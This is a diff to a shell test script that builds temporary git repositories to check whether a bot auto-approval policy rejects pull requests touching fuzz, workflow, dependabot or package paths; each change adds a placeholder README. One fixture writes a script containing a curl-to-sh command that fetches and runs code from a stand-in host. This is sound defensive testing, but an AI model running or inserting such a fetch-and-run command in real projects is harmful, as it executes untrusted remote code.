@@ -3617,6 +3617,7 @@ fi
 D78="$WORK/bot-allowed-a5-fuzzdir-token"
 new_repo "$D78"
 mkdir -p "$D78/crates/pol/notfuzz"
+printf 'placeholder\n' > "$D78/README.md"
 commit_all "$D78" base
 git -C "$D78" checkout -qb pr
 printf 'attacker-controlled content, no sibling manifest ties it to anything reviewed\n' > "$D78/crates/pol/notfuzz/Cargo.lock"
@@ -3650,6 +3651,7 @@ fi
 D79="$WORK/bot-allowed-a5-dir-token"
 new_repo "$D79"
 mkdir -p "$D79/vendor/pol/fuzz"
+printf 'placeholder\n' > "$D79/README.md"
 commit_all "$D79" base
 git -C "$D79" checkout -qb pr
 printf 'attacker-controlled content, no sibling manifest ties it to anything reviewed\n' > "$D79/vendor/pol/fuzz/Cargo.lock"
@@ -3685,6 +3687,7 @@ fi
 D80="$WORK/bot-allowed-a5-filename-token"
 new_repo "$D80"
 mkdir -p "$D80/crates/pol/fuzz"
+printf 'placeholder\n' > "$D80/README.md"
 commit_all "$D80" base
 git -C "$D80" checkout -qb pr
 printf '#!/bin/sh\ncurl https://example.invalid/x | sh\n' > "$D80/crates/pol/fuzz/payload.sh"
@@ -3719,6 +3722,7 @@ fi
 D81="$WORK/bot-allowed-a6-ext-token"
 new_repo "$D81"
 mkdir -p "$D81/.github/workflows"
+printf 'placeholder\n' > "$D81/README.md"
 commit_all "$D81" base
 git -C "$D81" checkout -qb pr
 printf '#!/bin/sh\necho attacker-controlled\n' > "$D81/.github/workflows/helper.sh"
@@ -3754,6 +3758,7 @@ fi
 D82="$WORK/bot-allowed-a6-depth-token"
 new_repo "$D82"
 mkdir -p "$D82/.github/workflows"
+printf 'placeholder\n' > "$D82/README.md"
 commit_all "$D82" base
 git -C "$D82" checkout -qb pr
 mkdir -p "$D82/.github/workflows/nested"
@@ -3790,6 +3795,7 @@ fi
 D83="$WORK/bot-allowed-a6-dir-token"
 new_repo "$D83"
 mkdir -p "$D83/.github"
+printf 'placeholder\n' > "$D83/README.md"
 commit_all "$D83" base
 git -C "$D83" checkout -qb pr
 mkdir -p "$D83/.github/actions/setup"
@@ -3825,6 +3831,7 @@ fi
 D84="$WORK/bot-allowed-a7-name-token"
 new_repo "$D84"
 mkdir -p "$D84/.github"
+printf 'placeholder\n' > "$D84/README.md"
 commit_all "$D84" base
 git -C "$D84" checkout -qb pr
 printf 'not dependabot config\n' > "$D84/.github/other.yml"
@@ -3860,6 +3867,7 @@ fi
 D85="$WORK/bot-allowed-a7-ext-token"
 new_repo "$D85"
 mkdir -p "$D85/.github"
+printf 'placeholder\n' > "$D85/README.md"
 commit_all "$D85" base
 git -C "$D85" checkout -qb pr
 printf '#!/bin/sh\necho attacker-controlled\n' > "$D85/.github/dependabot.sh"
@@ -3894,6 +3902,7 @@ fi
 D86="$WORK/bot-allowed-a8-filename-token"
 new_repo "$D86"
 mkdir -p "$D86/packages/dashboard"
+printf 'placeholder\n' > "$D86/README.md"
 commit_all "$D86" base
 git -C "$D86" checkout -qb pr
 printf '{"not":"package.json"}\n' > "$D86/packages/dashboard/malicious.json"
@@ -3928,6 +3937,7 @@ fi
 D87="$WORK/bot-allowed-a8-dir-token"
 new_repo "$D87"
 mkdir -p "$D87/vendor/dashboard"
+printf 'placeholder\n' > "$D87/README.md"
 commit_all "$D87" base
 git -C "$D87" checkout -qb pr
 printf '{"name":"dashboard","version":"0.1.0"}\n' > "$D87/vendor/dashboard/package.json"
@@ -3962,6 +3972,7 @@ fi
 D88="$WORK/bot-allowed-a8-depth-token"
 new_repo "$D88"
 mkdir -p "$D88/packages/dashboard"
+printf 'placeholder\n' > "$D88/README.md"
 commit_all "$D88" base
 git -C "$D88" checkout -qb pr
 mkdir -p "$D88/packages/dashboard/nested"
